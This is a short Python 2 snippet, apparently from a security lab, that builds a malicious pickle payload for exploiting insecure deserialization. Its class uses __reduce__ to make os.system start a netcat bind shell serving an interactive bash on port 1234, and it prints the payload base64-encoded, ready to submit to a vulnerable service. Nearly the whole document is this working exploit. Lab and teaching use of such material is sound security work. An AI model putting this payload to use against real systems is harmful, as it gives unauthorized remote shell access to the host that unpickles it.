# This snippet was used in a lab to run an remote command and obtain access. Pickle has an insecure deserialization vulnerability which allows remote code execution.

import cPickle as pickle
import os
import base64


class Blah(object):
  def __reduce__(self):
    return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print base64.b64encode(pickle.dumps(Blah(), 2))
